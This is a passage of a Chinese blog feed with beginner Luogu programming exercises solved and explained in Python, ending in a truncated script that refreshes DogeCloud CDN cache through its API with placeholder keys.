<li><p><code>if count == 0: print(&quot;Jolly&quot;) else: print(&quot;Not jolly&quot;)</code>: 最后，根据 <code>count</code> 的值判断是否存在欢乐的跳，如果 <code>count</code> 为 0，表示所有的差的绝对值都被标记过，输出 “Jolly”，否则输出 “Not jolly”。</p>
</li>
</ol>
<p>综上所述，这段代码通过记录数组中差的绝对值是否被标记过来判断数组是否符合“欢乐的跳”的条件。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li><p><code>list(map(int, input().split()))</code>接受有空格间隔的连续输入</p>
</li>
<li><p>通过切片来进行列表的自定义索引循环</p>
</li>
</ul>
<p>如果你想循环一个列表，并从索引 1 开始而不是从索引 0 开始，你可以使用 Python 中的切片。切片允许你从列表中选择一个子序列。对于循环来说，你可以使用切片来创建一个新的列表，从索引 1 开始，然后对这个新列表进行迭代。</p>
<p>例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从索引 1 开始循环</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> my_list[<span class="number">1</span>:]:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure></div>

<p>在这个例子中，<code>my_list[1:]</code> 创建了一个新列表，其中包含从索引 1 到列表末尾的所有元素。然后，<code>for</code> 循环遍历这个新列表。这样就可以从索引 1 开始循环遍历原始列表了。</p>
<p>注意：使用切片创建的是原列表的副本，因此对新列表的修改不会影响原列表。</p>
<ul>
<li>if的灵活运用</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if 0 in w1[1:]:  # 使用生成器表达式检查是否存在未被标记的差的绝对值</span><br></pre></td></tr></table></figure></div>

<ul>
<li>if和any函数结合</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if any(i == 0 for i in w1[1:]):</span><br></pre></td></tr></table></figure></div>

<ul>
<li>any函数</li>
</ul>
<p><code>any()</code> 函数是 Python 中的一个内置函数，它用于检查可迭代对象中是否存在任何为真（即非零、非空、非空字符串、非空列表等）的元素。如果可迭代对象中至少有一个元素为真，则返回 <code>True</code>；否则，返回 <code>False</code>。</p>
<p>以下是 <code>any()</code> 函数的基本语法：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">any</span>(iterable)</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>iterable</code> 是一个可迭代对象，比如列表、元组、集合、字典的键等。</p>
<p>举个例子，假设我们有一个列表，想要检查其中是否有任何元素为偶数：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line">result = <span class="built_in">any</span>(x % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> my_list)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: True，因为列表中存在偶数 6</span></span><br></pre></td></tr></table></figure></div>

<p>在这个例子中，我们使用了生成器表达式来生成一个布尔值的迭代器，然后将其传递给 <code>any()</code> 函数。这个迭代器会遍历列表中的每个元素，检查它是否为偶数。因为列表中存在偶数 6，所以 <code>any()</code> 函数返回 <code>True</code>。</p>
<p><code>any()</code> 函数通常用于在条件中检查多个布尔值，以简化代码逻辑。</p>
<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>嗓子好疼，好困，今天就学到这吧，就刷了一道题</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>P5705 【深基2.例7】数字反转</title>
    <url>/posts/9e0fed2d.html</url>
    <content><![CDATA[<h1 id="【深基2-例7】数字反转"><a href="#【深基2-例7】数字反转" class="headerlink" title="【深基2.例7】数字反转"></a>【深基2.例7】数字反转</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>输入一个不小于 $100$ 且小于 $1000$，同时包括小数点后一位的一个浮点数，例如 $123.4$ ，要求把这个数字翻转过来，变成 $4.321$ 并输出。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一行一个浮点数</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>一行一个浮点数</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.4</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.321</span><br></pre></td></tr></table></figure></div>

<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">fff = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">nnn = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fff[::-<span class="number">1</span>]:</span><br><span class="line">    nnn += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(nnn))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这题也不难，学一下里面的知识点</p>
<p>逆向循环可以通过切片来实现</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in fff[::-1]:</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>P5707 【深基2.例12】上学迟到</title>
    <url>/posts/499d85c8.html</url>
    <content><![CDATA[<h1 id="【深基-2-例-12】上学迟到"><a href="#【深基-2-例-12】上学迟到" class="headerlink" title="【深基 2.例 12】上学迟到"></a>【深基 2.例 12】上学迟到</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>学校和 yyy 的家之间的距离为 $s$ 米，而 yyy 以 $v$ 米每分钟的速度匀速走向学校。</p>
<p>在上学的路上，yyy 还要额外花费 $10$ 分钟的时间进行垃圾分类。</p>
<p>学校要求必须在上午 $\textrm{8:00}$  到达，请计算在不迟到的前提下，yyy 最晚能什么时候出门。</p>
<p>由于路途遥远，yyy 可能不得不提前一点出发，但是提前的时间不会超过一天。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一行两个正整数 $s,v$，分别代表路程和速度。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一个 $24$ 小时制下的时间，代表 yyy 最晚的出发时间。</p>
<p>输出格式为 $\texttt{HH:MM}$，分别代表该时间的时和分。必须输出两位，不足前面补 $0$。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">100 99</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">07:48</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于 $100%$ 的数据，$1 \le s,v \le 10^4$。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">s, v = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">t = s / v + <span class="number">10</span>  <span class="comment"># 需要花费的总时间（分钟）</span></span><br><span class="line">ddl = datetime.strptime(<span class="string">&quot;08:00&quot;</span>, <span class="string">&quot;%H:%M&quot;</span>)</span><br><span class="line">time = timedelta(minutes=t)</span><br><span class="line">end_time = ddl - time</span><br><span class="line"><span class="built_in">print</span>(end_time.strftime(<span class="string">&quot;%H:%M&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><p>这段代码用于解决一个问题，即计算在不迟到的前提下，某人最晚能什么时候出门以及什么时候到达学校。</p>
<p>首先，代码从标准输入中读取两个整数，分别表示路程 <code>s</code> 和速度 <code>v</code>。这两个值是由空格分隔的。这段代码使用了 <code>map(int, input().split())</code> 来同时读取输入的两个整数，并将其分别赋值给变量 <code>s</code> 和 <code>v</code>。</p>
<p>接下来，计算需要花费的总时间 <code>t</code>。总时间等于路程 <code>s</code> 除以速度 <code>v</code>，再加上额外的 $10$ 分钟用于垃圾分类。因此，<code>t = s / v + 10</code>，单位是分钟。</p>
<p>然后，使用 <code>datetime.strptime(&quot;08:00&quot;, &quot;%H:%M&quot;)</code> 将字符串时间 “08: 00” 转换为 <code>datetime</code> 对象，表示学校的到达时间。这里使用了 <code>&quot;%H:%M&quot;</code> 格式指定解析的时间格式。</p>
<p>接着，使用 <code>timedelta(minutes=t)</code> 创建一个时间间隔对象，表示需要花费的总时间。</p>
<p>最后，通过 <code>ddl - time</code> 计算出最晚出门的时间，即学校的到达时间减去需要花费的总时间，得到了 <code>end_time</code>。然后，通过 <code>end_time.strftime(&quot;%H:%M&quot;)</code> 将 <code>end_time</code> 格式化为 “%H:%M” 格式的字符串，并打印出来。</p>
<p>整体而言，这段代码的作用是计算在不迟到的前提下，某人最晚能在什么时间出门。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>利用这题学习一下时间的计算</p>
<p>当涉及到时间计算时，这段代码涵盖了以下几个关键的知识点：</p>
<ol>
<li><strong>时间表示</strong>：使用 <code>datetime</code> 模块中的 <code>datetime</code> 类来表示具体的时间点。</li>
<li><strong>时间间隔表示</strong>：使用 <code>timedelta</code> 类来表示时间间隔。</li>
<li><strong>时间格式化</strong>：使用 <code>strftime</code> 方法将 <code>datetime</code> 对象格式化为指定格式的字符串。</li>
<li><strong>时间加减法</strong>：通过 <code>datetime</code> 对象和 <code>timedelta</code> 对象进行加减法运算，实现时间的加减操作。</li>
<li><strong>时间字符串转换</strong>：使用 <code>strptime</code> 方法将字符串时间解析为 <code>datetime</code> 对象。</li>
</ol>
<p>这些知识点在处理时间相关的计算和操作时非常重要，并且在实际开发中经常会被用到。</p>
<p>只想要结果保留小时和分钟部分，可以使用 <code>strftime</code> 方法来格式化输出结果。</p>
<p>例如 <code>print(end_time.strftime(&quot;%H:%M&quot;))</code></p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>P5718 【深基4.例2】找最小值</title>
    <url>/posts/d9940956.html</url>
    <content><![CDATA[<h1 id="【深基-4-例-2】找最小值"><a href="#【深基-4-例-2】找最小值" class="headerlink" title="【深基 4.例 2】找最小值"></a>【深基 4.例 2】找最小值</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给出 $n$ 和 $n$ 个整数 $a_i$，求这 $n$ 个整数中最小值是什么。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行输入一个正整数 $n$，表示数字个数。</p>
<p>第二行输入 $n$ 个非负整数，表示 $a_1,a_2 \dots a_n$，以空格隔开。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一个非负整数，表示这 $n$ 个非负整数中的最小值。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8</span><br><span class="line">1 9 2 6 0 8 1 7</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>数据保证，$n\le100$ 且 $0\le a_i \le 1000$。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">ai = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>(ai))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><ol>
<li><p><code>n = int(input())</code>: 这一行代码首先接收用户输入的一个整数（假设表示整数个数），并通过 <code>int()</code> 函数将其转换成整型数据，然后将这个整数值赋给变量 <code>n</code>。</p>
</li>
<li><p><code>ai = list(map(int, input().split()))</code>: 这一行代码接收用户输入的一行以空格分隔的整数序列。<code>input().split()</code> 会获取用户输入的一行文本，并按空格进行分割，返回一个包含所有字符串子串的列表。接着，<code>map(int, ...)</code> 函数会将列表中的每个字符串元素转换成整数。最后，<code>list(...)</code> 将转换后的整数生成器表达式转换为列表。因此，<code>ai</code> 现在是一个包含 <code>n</code> 个整数的列表。</p>
</li>
<li><p><code>print(min(ai))</code>: 这一行使用 Python 内置的 <code>min()</code> 函数，在列表 <code>ai</code> 中找到并返回最小的整数值，并通过 <code>print()</code> 函数将其打印出来。所以最终结果就是输出用户输入的所有整数中的最小值。</p>
</li>
</ol>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>用这个题学习一下取最小函数</p>
<p>min()</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>P5726 【深基4.习9】打分</title>
    <url>/posts/904f42f7.html</url>
    <content><![CDATA[<h1 id="P5726-【深基4-习9】打分"><a href="#P5726-【深基4-习9】打分" class="headerlink" title="P5726 【深基4.习9】打分"></a>P5726 【深基4.习9】打分</h1><h1 id="【深基4-习9】打分"><a href="#【深基4-习9】打分" class="headerlink" title="【深基4.习9】打分"></a>【深基4.习9】打分</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>现在有 $n(n \le 1000)$ 位评委给选手打分，分值从 $0$ 到 $10$。需要去掉一个最高分，去掉一个最低分（如果有多个最高或者最低分，也只需要去掉一个），剩下的评分的平均数就是这位选手的得分。现在输入评委人数和他们的打分，请输出选手的最后得分，精确到 $2$ 位小数。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行输入一个正整数 $n$，表示有 $n$ 个评委。</p>
<p>第二行输入 $n$ 个正整数，第 $i$ 个正整数表示第 $i$ 个评委打出的分值。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行一个两位小数，表示选手的最后得分。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">9</span> <span class="number">5</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span></span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">7.67</span></span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>数据保证，$3 \leq n \leq 1000$，每个评委打出的分值为为 $0$ 到 $10$（含 $0$ 与 $10$）之间的整数。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">score = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"><span class="built_in">min</span> = <span class="built_in">min</span>(score)</span><br><span class="line"><span class="built_in">max</span> = <span class="built_in">max</span>(score)</span><br><span class="line">score.remove(<span class="built_in">min</span>)</span><br><span class="line">score.remove(<span class="built_in">max</span>)</span><br><span class="line">average = <span class="built_in">sum</span>(score) / <span class="built_in">len</span>(score)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.3&#125;&quot;</span>.<span class="built_in">format</span>(average))</span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><p>这段代码是一个Python程序，用于计算选手的最后得分。下面是对代码的解释：</p>
<ol>
<li>程序首先从标准输入中读取评委的人数 $n$。</li>
<li>接下来，程序从标准输入中读取了一行，其中包含了 $n$ 个评委给选手的打分，这些打分用空格分隔开。</li>
<li>然后，程序将这些分数转换为整数并存储在名为 <code>score</code> 的列表中。</li>
<li>程序找到了列表中的最低分和最高分，通过使用 <code>min()</code> 和 <code>max()</code> 函数来实现。</li>
<li>接着，程序使用 <code>remove()</code> 函数将最低分和最高分从列表中删除，这样列表中就只剩下了去掉最低分和最高分后的评委分数。</li>
<li>程序计算剩下评委的分数的平均值，通过求和所有分数并除以剩余评委的数量来实现。</li>
<li>最后，程序使用 <code>format()</code> 函数将平均值格式化为两位小数，并将结果打印到标准输出。</li>
</ol>
<p>这段代码的逻辑是合理的，能够正确计算选手的最终得分。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这段代码涉及了几个Python编程的知识点：</p>
<ol>
<li>输入输出：使用 <code>input()</code> 函数从标准输入读取数据，并使用 <code>print()</code> 函数将结果输出到标准输出。</li>
<li>列表操作：使用列表来存储评委的打分，并对列表进行操作，如查找最大值、最小值以及删除元素。</li>
<li>循环与条件语句：虽然代码中没有显式的循环或条件语句，但在某种程度上，使用了内置函数 <code>min()</code> 和 <code>max()</code> 来找到最低分和最高分，这可以视为在列表元素上进行了一种隐式的遍历和比较。</li>
<li>字符串格式化：使用 <code>format()</code> 函数对浮点数进行格式化，以保留指定位数的小数位数。</li>
<li>数学计算：计算列表中元素的和以及求列表的长度，用于计算评委得分的平均值。</li>
</ol>
<p>综上所述，这段代码涵盖了Python中的一些基本概念，包括输入输出、数据结构、条件语句、循环、字符串格式化和数学计算。</p>
<h2 id="代码改进"><a href="#代码改进" class="headerlink" title="代码改进"></a>代码改进</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取评委人数和打分</span></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">score = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">input</span>().split()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除最高分和最低分</span></span><br><span class="line">score = <span class="built_in">sorted</span>(score)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算平均分并输出</span></span><br><span class="line">average = <span class="built_in">sum</span>(score) / <span class="built_in">len</span>(score)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(average))</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>Peter 的烟</title>
    <url>/posts/80cc5efe.html</url>
    <content><![CDATA[<h1 id="Peter-的烟"><a href="#Peter-的烟" class="headerlink" title="Peter 的烟"></a>Peter 的烟</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p><strong>温馨提醒：吸烟有害健康，请勿尝试吸烟！</strong></p>
<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Peter 有 $n$ 根烟，他每吸完一根烟就把烟蒂保存起来，$k$（$k&gt;1$）个烟蒂可以换一个新的烟，那么 Peter 最终能吸到多少根烟呢？</p>
<p>与某些脑筋急转弯不同的是，Peter 并不能从异次元借到烟蒂，抽完后再还回去。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>每组测试数据一行包括两个整数 $n, k$（$1 &lt; n, k \le 10^8$）。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>对于每组测试数据，输出一行包括一个整数表示最终烟的根数。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure></div>

<h2 id="样例-2"><a href="#样例-2" class="headerlink" title="样例 #2"></a>样例 #2</h2><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入 #2"></a>样例输入 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出 #2"></a>样例输出 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">14</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于 $100%$ 的数据，$1&lt;n, k \le 10^8$。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">n, k = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">sum_smoke = n</span><br><span class="line">sum_di = n</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">int</span>(sum_di / k) &gt; <span class="number">0</span>:</span><br><span class="line">    sum_smoke += <span class="built_in">int</span>(sum_di / k)</span><br><span class="line">    sum_di = <span class="built_in">int</span>(sum_di / k) + <span class="built_in">int</span>(sum_di % k)</span><br><span class="line"><span class="built_in">print</span>(sum_smoke)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>第一行读取两个输入</p>
<p>第二行第三行定义烟的总数和烟蒂的总数</p>
<p>初始化烟和烟蒂肯定都是n</p>
<p>然后执行循环，判断，如果还能换烟，就执行循环体</p>
<p>循环体内容是把换来的烟加到烟的总数，然后重置烟蒂的数量。</p>
<blockquote>
<p>这边有个注意的点就是，烟蒂的数量是换完之后剩下换不了的烟蒂加上换来的烟（抽完就是烟蒂），我第一次没有加换之前剩余的，所以有一个没通过</p>
</blockquote>
<p>最后输出烟的总数</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>整除取整整除取余</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>Python+多吉云api实现脚本刷新CDN缓存</title>
    <url>/posts/51225c3e.html</url>
    <content><![CDATA[<p>把下面代码复制之后，修改自己的key，直接跑就行</p>
<p>在大佬的代码基础上增加了可选择的刷新形式</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dogecloud_api</span>(<span class="params">api_path, data=&#123;&#125;, json_mode=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    调用多吉云API</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param api_path:    调用的 API 接口地址，包含 URL 请求参数 QueryString，例如：/console/vfetch/add.json?url=xxx&amp;a=1&amp;b=2</span></span><br><span class="line"><span class="string">    :param data:        POST 的数据，字典，例如 &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2&#125;，传递此参数表示不是 GET 请求而是 POST 请求</span></span><br><span class="line"><span class="string">    :param json_mode:   数据 data 是否以 JSON 格式请求，默认为 false 则使用表单形式（a=1&amp;b=2）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :type api_path: string</span></span><br><span class="line"><span class="string">    :type data: dict</span></span><br><span class="line"><span class="string">    :type json_mode bool</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :return dict: 返回的数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里替换为你的多吉云永久 AccessKey 和 SecretKey，可在用户中心 - 密钥管理中查看</span></span><br><span class="line">    <span class="comment"># 请勿在客户端暴露 AccessKey 和 SecretKey，否则恶意用户将获得账号完全控制权</span></span><br><span class="line">    access_key = <span class="string">&quot;XXXXXXXX&quot;</span></span><br><span class="line">    secret_key = <span class="string">&quot;XXXXXXXX&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造请求正文和 MIME 类型</span></span><br><span class="line">    <span class="keyword">if</span> json_mode:</span><br><span class="line">        body = json.dumps(data)</span><br><span class="line">        mime = <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        body = urllib.parse.urlencode(data)</span><br><span class="line">        mime = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造签名字符串并计算签名</span></span><br><span class="line">    sign_str = api_path + <span class="string">&quot;\n&quot;</span> + body</span><br><span class="line">    signed_data = hmac.new(secret_key.encode(<span class="string">&quot;utf-8&quot;</span>), sign_str.encode(<span class="string">&quot;utf-8&quot;</span>), sha1)</span><br><span class="line">    sign = signed_data.digest().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造 Authorization 头部</span></span><br><span class="line">    authorization = <span class="string">&quot;TOKEN &quot;</span> + access_key + <span class="string">&quot;:&quot;</span> + sign</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发起请求</span></span><br><span class="line">    response = requests.post(</span><br><span class="line">        <span class="string">&quot;https://api.dogecloud.com&quot;</span> + api_path,</span><br><span class="line">        data=body,</span><br><span class="line">        headers=&#123;<span class="string">&quot;Authorization&quot;</span>: authorization, <span class="string">&quot;Content-Type&quot;</span>: mime&#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回响应的 JSON 数据</span></span><br><span class="line">    <span class="keyword">return</span> response.json()</span><br><span class="line"></span><br><span 